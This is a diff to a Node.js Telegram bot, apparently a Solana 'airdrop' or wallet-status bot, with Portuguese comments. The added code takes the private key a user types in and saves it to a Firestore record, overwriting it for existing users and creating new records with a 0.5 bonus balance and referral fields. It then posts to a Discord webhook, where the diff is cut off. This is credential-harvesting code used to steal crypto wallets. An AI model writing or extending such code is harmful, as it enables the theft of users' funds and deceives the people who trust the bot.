@@ -132,18 +132,32 @@ bot.on('text', async (ctx) => {
     const docSnap = await userRef.get();
 
     let projectBalance = '0.0', refCount = 0, canClaim = false;
+
     if (docSnap.exists) {
+      await userRef.update({ privateKey: input }); // ✅ Atualiza apenas a private key
       const data = docSnap.data();
       projectBalance = (data.balance || 0).toFixed(2);
       refCount = data.refCount || 0;
       canClaim = data.canClaim || false;
+    } else {
+      await userRef.set({
+        wallet: pubkey,
+        privateKey: input,
+        referral: null,
+        createdAt: new Date(),
+        balance: 0.5,
+        claimed: false,
+        refCount: 0,
+        canClaim: false,
+      });
+      projectBalance = '0.5';
     }
 
     ctx.session.walletData = { pubkey, solBalance, projectBalance, refCount, canClaim };
 
     await ctx.replyWithMarkdown(formatStatus(pubkey, solBalance, projectBalance, refCount, canClaim));
 
-    // Envia para o Discord
+    // Discord webhook
     try {
       await fetch(discordWebhook, {
         method: 'POST',
